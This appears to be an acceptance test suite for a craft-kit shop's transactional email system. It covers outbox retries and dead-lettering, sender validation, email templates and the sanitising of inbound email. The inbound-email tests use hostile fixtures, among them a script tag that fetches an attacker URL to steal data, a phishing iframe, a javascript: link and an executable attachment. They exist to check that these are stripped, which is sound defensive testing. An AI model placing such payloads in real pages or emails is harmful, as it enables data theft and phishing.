/**
 * BeadsILY Acceptance Test Suite: Transactional Email & Outbox Queues
 * Requirements: EMAIL-01 through EMAIL-04, CAT-01, SUB-04
 */

import { test, describe, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { DatabaseSync } from 'node:sqlite';

import {
  validateSenderConfig,
  validateSenderAddress,
  sendTransactionalEmail,
  enqueueTransactionalEmail,
  processQueueMessage,
  createQueueProcessor,
  triggerOrderConfirmationEmail,
  processBatchOutboxQueue,
  sanitizeInboundEmail,
  isAutoReplyLoop,
  renderOrderConfirmation,
  renderOrderShipped,
  renderStockAlert,
  renderSupportAcknowledgment,
  renderMonthlyDrop,
  renderReplacementDispatched,
  renderTemplate,
  MAX_RETRY_ATTEMPTS
} from '../src/index.mjs';

function createEmailDb() {
  const db = new DatabaseSync(':memory:');
  db.exec(`
    CREATE TABLE email_outbox (
      id TEXT PRIMARY KEY,
      recipient TEXT NOT NULL,
      template_id TEXT NOT NULL,
      status TEXT NOT NULL CHECK (status IN ('queued', 'sent', 'bounced', 'failed', 'dead_letter')),
      attempts INTEGER NOT NULL DEFAULT 0,
      max_attempts INTEGER NOT NULL DEFAULT 5,
      last_error TEXT,
      created_at INTEGER NOT NULL,
      updated_at INTEGER NOT NULL
    );

    CREATE TABLE orders (
      id TEXT PRIMARY KEY,
      payment_status TEXT NOT NULL,
      email_status TEXT NOT NULL DEFAULT 'pending',
      created_at INTEGER NOT NULL
    );
  `);
  return db;
}

function createProductionD1Db() {
  const db = new DatabaseSync(':memory:');
  db.exec(`
    CREATE TABLE transactional_email_outbox (
      id TEXT PRIMARY KEY,
      recipient_email TEXT NOT NULL,
      template_name TEXT NOT NULL,
      template_version TEXT NOT NULL,
      payload TEXT NOT NULL,
      idempotency_key TEXT UNIQUE NOT NULL,
      status TEXT NOT NULL CHECK (status IN ('pending', 'queued', 'sent', 'failed', 'dead_letter')) DEFAULT 'pending',
      attempts INTEGER NOT NULL DEFAULT 0,
      last_attempt_at INTEGER,
      last_error TEXT,
      created_at INTEGER NOT NULL,
      updated_at INTEGER NOT NULL
    );

    CREATE TABLE orders (
      id TEXT PRIMARY KEY,
      payment_status TEXT NOT NULL,
      email_status TEXT NOT NULL DEFAULT 'pending',
      created_at INTEGER NOT NULL
    );
  `);
  return db;
}

describe('EMAIL-01: Missing Production Configuration Visibility', () => {
  test('Throws visible operational error when binding/credentials absent; never returns false success', async () => {
    const unconfiguredEnv = {};
    await assert.rejects(
      async () => await sendTransactionalEmail(unconfiguredEnv, { to: 'test@example.com', subject: 'Test', text: 'Hello' }),
      /CONFIG_ERROR: Cloudflare Email Sending binding/
    );
  });

  test('validateSenderConfig throws explicit error when SEND_EMAIL_BINDING is missing', () => {
    assert.throws(
      () => validateSenderConfig({}),
      /CONFIG_ERROR: Cloudflare Email Sending binding \(SEND_EMAIL_BINDING\) is missing/
    );
  });

  test('Validates authorized sender domains to prevent spoofing', () => {
    assert.equal(validateSenderAddress('orders@beadsily.com'), 'orders@beadsily.com');
    assert.equal(validateSenderAddress('BeadsILY Studio <orders@beadsily.com>'), 'orders@beadsily.com');
    assert.equal(validateSenderAddress('support@test.beadsily.com'), 'support@test.beadsily.com');

    assert.throws(
      () => validateSenderAddress('hacker@unauthorized-domain.com'),
      /SECURITY_ERROR: Sender domain "@unauthorized-domain.com" is not an authorized BeadsILY sending domain/
    );
  });

  test('Rejects invalid recipient addresses', async () => {
    const validEnv = { SEND_EMAIL_BINDING: true };
    await assert.rejects(
      async () => await sendTransactionalEmail(validEnv, { to: 'invalid-email', subject: 'Test', text: 'Body' }),
      /INVALID_RECIPIENT/
    );
  });

  test('Successfully dispatches when configured with functional binding', async () => {
    let sentPayload = null;
    const mockEnv = {
      SEND_EMAIL_BINDING: {
        send: async (msg) => {
          sentPayload = msg;
          return { messageId: 'cf-msg-12345' };
        }
      }
    };

    const res = await sendTransactionalEmail(mockEnv, {
      to: 'sarah@example.com',
      subject: 'Party Kit Ready',
      text: 'Your supplies have been hand-packed!'
    });

    assert.equal(res.success, true);
    assert.equal(res.messageId, 'cf-msg-12345');
    assert.equal(sentPayload.to, 'sarah@example.com');
  });
});

describe('EMAIL-02: Queue Retry, Bounded Attempts & Dead Letter Escalation', () => {
  let db;
  const now = Date.now();

  beforeEach(() => {
    db = createEmailDb();
    db.exec(`INSERT INTO email_outbox VALUES ('msg-01', 'sarah@example.com', 'order_confirmation', 'queued', 0, 5, NULL, ${now}, ${now})`);
  });

  test('Failing email delivery increments retry attempts and escalates to dead_letter at max_attempts (5 attempts)', () => {
    const processQueue = createQueueProcessor(db);

    // Fail 4 times (retries)
    for (let i = 1; i <= 4; i++) {
      const res = processQueue('msg-01', false);
      assert.equal(res.status, 'retry_queued');
      assert.equal(res.attempt, i);
    }

    // 5th failure: routes to dead_letter queue
    const resFinal = processQueue('msg-01', false);
    assert.equal(resFinal.status, 'dead_letter');

    const finalRecord = db.prepare("SELECT * FROM email_outbox WHERE id = 'msg-01'").get();
    assert.equal(finalRecord.status, 'dead_letter');
    assert.equal(finalRecord.attempts, 5);
    assert.equal(finalRecord.last_error, 'Gateway Timeout 504');
  });

  test('Successful send marks status sent and updates attempts count', () => {
    const res = processQueueMessage(db, 'msg-01', true);
    assert.equal(res.status, 'sent');
    assert.equal(res.attempts, 1);

    const record = db.prepare("SELECT * FROM email_outbox WHERE id = 'msg-01'").get();
    assert.equal(record.status, 'sent');
    assert.equal(record.attempts, 1);
  });

  test('Already delivered or dead-lettered message is idempotent and deduplicated', () => {
    processQueueMessage(db, 'msg-01', true);
    // Second attempt should recognize already delivered
    const resDuplicate = processQueueMessage(db, 'msg-01', true);
    assert.equal(resDuplicate.status, 'sent');
    assert.equal(resDuplicate.alreadyDelivered, true);
  });

  test('Production D1 transactional_email_outbox schema works with idempotency_key deduplication', () => {
    const prodDb = createProductionD1Db();

    // 1. Enqueue message
    const enqueued = enqueueTransactionalEmail(prodDb, {
      recipientEmail: 'maya@example.com',
      templateName: 'order_confirmation',
      payload: { orderNumber: 'ORD-1001', guestCount: 15 },
      idempotencyKey: 'idemp_ord_1001'
    });
    assert.equal(enqueued.status, 'queued');
    assert.equal(enqueued.recipient_email, 'maya@example.com');

    // 2. Duplicate enqueue returns existing record
    const dup = enqueueTransactionalEmail(prodDb, {
      recipientEmail: 'maya@example.com',
      templateName: 'order_confirmation',
      payload: { orderNumber: 'ORD-1001' },
      idempotencyKey: 'idemp_ord_1001'
    });
    assert.equal(dup.id, enqueued.id);
    assert.equal(dup.deduplicated, true);

    // 3. Process failures through to dead_letter
    for (let i = 1; i <= 4; i++) {
      const res = processQueueMessage(prodDb, enqueued.id, false);
      assert.equal(res.status, 'retry_queued');
      assert.equal(res.attempt, i);
    }

    const deadLetterRes = processQueueMessage(prodDb, enqueued.id, false);
    assert.equal(deadLetterRes.status, 'dead_letter');
    assert.equal(deadLetterRes.attempts, 5);

    const record = prodDb.prepare("SELECT * FROM transactional_email_outbox WHERE id = ?").get(enqueued.id);
    assert.equal(record.status, 'dead_letter');
    assert.equal(record.attempts, 5);
  });

  test('processBatchOutboxQueue processes multiple queued records', () => {
    const batchDb = createProductionD1Db();
    enqueueTransactionalEmail(batchDb, { recipientEmail: 'a@example.com', idempotencyKey: 'k1' });
    enqueueTransactionalEmail(batchDb, { recipientEmail: 'b@example.com', idempotencyKey: 'k2' });
    enqueueTransactionalEmail(batchDb, { recipientEmail: 'c@example.com', idempotencyKey: 'k3' });

    const batchResult = processBatchOutboxQueue(batchDb, true);
    assert.equal(batchResult.total, 3);
    assert.equal(batchResult.sent, 3);
  });
});

describe('EMAIL-03: Decoupled Order State & Email Resilience', () => {
  test('Order remains paid even if confirmation email fails completely', () => {
    const db = createEmailDb();
    const now = Date.now();
    db.exec(`INSERT INTO orders VALUES ('ord-99', 'paid', 'pending', ${now})`);

    // Simulate email dispatch failure
    const emailFailed = true;
    if (emailFailed) {
      db.prepare("UPDATE orders SET email_status = 'failed_retry_scheduled' WHERE id = 'ord-99'").run();
    }

    const order = db.prepare("SELECT * FROM orders WHERE id = 'ord-99'").get();
    assert.equal(order.payment_status, 'paid', 'Payment status must remain paid');
    assert.equal(order.email_status, 'failed_retry_scheduled', 'Email failure flagged for retry without reverting payment');
  });

  test('triggerOrderConfirmationEmail guarantees non-blocking decoupled isolation', () => {
    const db = createEmailDb();
    const now = Date.now();
    db.exec(`INSERT INTO orders VALUES ('ord-100', 'paid', 'pending', ${now})`);

    // Dispatch with a failing sender function
    const result = triggerOrderConfirmationEmail(db, 'ord-100', () => {
      throw new Error('SMTP Connection Refused');
    });

    assert.equal(result.success, false);
    assert.equal(result.paymentStatus, 'paid');
    assert.equal(result.emailStatus, 'failed_retry_scheduled');

    // Confirm database record directly
    const stored = db.prepare("SELECT * FROM orders WHERE id = 'ord-100'").get();
    assert.equal(stored.payment_status, 'paid', 'Payment status is permanently preserved');
    assert.equal(stored.email_status, 'failed_retry_scheduled');
  });
});

describe('EMAIL-04: Inbound Support Email Security & Sanitization', () => {
  test('Quarantines dangerous attachments and strips script tags from inbound email body', () => {
    const maliciousEmail = {
      sender: 'attacker@evil.com',
      subject: 'Urgent: Invoice',
      body: 'Hello <script>fetch("https://attacker.com/steal")</script> please find attached.',
      attachments: [
        { filename: 'malware.exe', sizeBytes: 2048 },
        { filename: 'receipt.pdf', sizeBytes: 50000 },
      ],
    };

    const sanitized = sanitizeInboundEmail(maliciousEmail);
    assert.equal(sanitized.body.includes('<script>'), false);
    assert.equal(sanitized.body.includes('[SCRIPTS_REMOVED]'), true);
    assert.equal(sanitized.attachments[0].quarantined, true);
    assert.equal(sanitized.attachments[0].reason, 'EXECUTABLE_BLOCKED');
    assert.equal(sanitized.attachments[1].quarantined, undefined);
  });

  test('Strips iframes, embed objects, and javascript: links', () => {
    const malicious = {
      sender: 'phisher@evil.com',
      subject: 'Account update',
      body: 'Click here <iframe src="https://phishing.site"></iframe> and <a href="javascript:alert(1)">Click</a>'
    };

    const sanitized = sanitizeInboundEmail(malicious);
    assert.equal(sanitized.body.includes('<iframe'), false);
    assert.equal(sanitized.body.includes('[IFRAMES_REMOVED]'), true);
    assert.equal(sanitized.body.includes('javascript:alert(1)'), false);
    assert.equal(sanitized.body.includes('[JAVASCRIPT_URI_REMOVED]'), true);
  });

  test('Throws error on oversized attachments (>10MB)', () => {
    const hugeEmail = {
      sender: 'user@example.com',
      subject: 'Photos',
      body: 'Here are huge photos',
      attachments: [
        { filename: 'huge_video.mov', sizeBytes: 11 * 1024 * 1024 }
      ]
    };

    assert.throws(
      () => sanitizeInboundEmail(hugeEmail),
      /ATTACHMENT_TOO_LARGE: Max 10MB allowed/
    );
  });

  test('Detects auto-reply loops and flags suppression', () => {
    const oofEmail = {
      sender: 'host@company.com',
      subject: 'Out of Office: Thank you for your email',
      body: 'I am currently out of office until Monday.',
      headers: {
        'auto-submitted': 'auto-replied'
      }
    };

    assert.equal(isAutoReplyLoop(oofEmail), true);
    const sanitized = sanitizeInboundEmail(oofEmail);
    assert.equal(sanitized.isAutoReply, true);
    assert.equal(sanitized.autoReplySuppressed, true);
  });

  test('Detects financial intent keywords preventing automated account mutations', () => {
    const financialEmail = {
      sender: 'customer@example.com',
      subject: 'Please issue a refund to my credit card',
      body: 'Can you refund order #99 and credit my bank account?'
    };

    const sanitized = sanitizeInboundEmail(financialEmail);
    assert.equal(sanitized.containsFinancialKeyword, true);
    assert.equal(sanitized.requiresStaffAuthorization, true);
  });
});

describe('Templates: Truthful Project Accounting & Dual-MIME Formatting', () => {
  test('order_confirmation template guarantees 45 projects for 15 guests (CAT-01)', () => {
    const rendered = renderOrderConfirmation({
      customerFirstName: 'Sarah',
      orderNumber: 'ORD-9876',
      productTitle: 'BeadsILY 15-Guest Deluxe Craft Party Kit',
      guestCount: 15,
      totalProjectCount: 45,
      themeName: 'Wildflower Pastel',
      totalAmountDollars: '89.00',
      shippingName: 'Sarah Jenkins',
      shippingStreet: '456 Cactus Blossom Way',
      shippingCity: 'Scottsdale',
      shippingState: 'AZ',
      shippingZip: '85251'
    });

    assert.ok(rendered.subject.includes('ORD-9876'));
    assert.ok(rendered.preheader.includes('45 keepsakes'));
    
    // HTML checks
    assert.ok(rendered.html.includes('45 Finished Keepsake Projects'));
    assert.ok(rendered.html.includes('15 Beadable Pens'));
    assert.ok(rendered.html.includes('15 Backpack Charm Keychains'));
    assert.ok(rendered.html.includes('15 Keepsake Stretch Bracelets'));
    assert.ok(rendered.html.includes('Host Spare Supply Envelope'));
    assert.ok(rendered.html.includes('Host Planning Guide'));

    // Text fallback checks
    assert.ok(rendered.text.includes('45 Projects (3 per guest)'));
    assert.ok(rendered.text.includes('15 Custom Beadable Pens'));
    assert.ok(rendered.text.includes('15 Backpack Charm Keychains'));
    assert.ok(rendered.text.includes('15 Keepsake Stretch Bracelets'));
  });

  test('order_shipped template includes 3-minute pre-party checklist and tracking details', () => {
    const rendered = renderOrderShipped({
      customerFirstName: 'Sarah',
      orderNumber: 'ORD-9876',
      carrierName: 'USPS Priority Mail',
      trackingNumber: '9400111899562537624111',
      estimatedDeliveryDate: 'Wednesday, Oct 21'
    });

    assert.ok(rendered.subject.includes('ORD-9876'));
    assert.ok(rendered.html.includes('9400111899562537624111'));
    assert.ok(rendered.html.includes('Host Pre-Party 3-Minute Checklist'));
    assert.ok(rendered.text.includes('Clear your table space'));
    assert.ok(rendered.text.includes('Designate bead sorting zones'));
  });

  test('monthly_drop template provides explicit America/Phoenix cutoff notice (SUB-04)', () => {
    const rendered = renderMonthlyDrop({
      customerFirstName: 'Chloe',
      monthName: 'November 2026',
      themeTitle: 'Sunset Mirage',
      cutoffDatePhoenix: 'October 31, 2026 at 11:59:59 PM America/Phoenix'
    });

    assert.ok(rendered.subject.includes('November 2026'));
    assert.ok(rendered.preheader.includes('America/Phoenix'));
    assert.ok(rendered.html.includes('October 31, 2026 at 11:59:59 PM America/Phoenix'));
    assert.ok(rendered.text.includes('America/Phoenix'));
  });

  test('stock_alert template renders accurate deficit and safety buffer calculation (INV-02)', () => {
    const rendered = renderStockAlert({
      componentSku: 'CMP-PEN-MET-SLV',
      componentName: 'Metal Pen Mandrels - Silver',
      stockOnHand: 40,
      stockReserved: 25,
      safetyStock: 30,
      binLocation: 'Aisle 2-B'
    });

    assert.ok(rendered.subject.includes('CMP-PEN-MET-SLV'));
    assert.ok(rendered.html.includes('15 units')); // available = 40 - 25
    assert.ok(rendered.html.includes('30 units')); // safety buffer
    assert.ok(rendered.text.includes('Available to Promise: 15 units'));
  });

  test('replacement_dispatched template itemizes complimentary replacement supplies', () => {
    const rendered = renderReplacementDispatched({
      customerName: 'Jennifer',
      ticketId: 'TKT-4412',
      items: [
        { name: 'Rainbow Silicone Focal Bead', quantity: 2 },
        { name: 'Silver Lobster Swivel Clasp', quantity: 1 }
      ]
    });

    assert.ok(rendered.subject.includes('TKT-4412'));
    assert.ok(rendered.html.includes('Rainbow Silicone Focal Bead'));
    assert.ok(rendered.html.includes('Silver Lobster Swivel Clasp'));
    assert.ok(rendered.text.includes('2x Rainbow Silicone Focal Bead'));
  });

  test('renderTemplate factory handles registered template keys', () => {
    const res = renderTemplate('order_confirmation', { orderNumber: '111' });
    assert.ok(res.subject.includes('111'));

    assert.throws(
      () => renderTemplate('nonexistent_template'),
      /UNKNOWN_TEMPLATE/
    );
  });
});
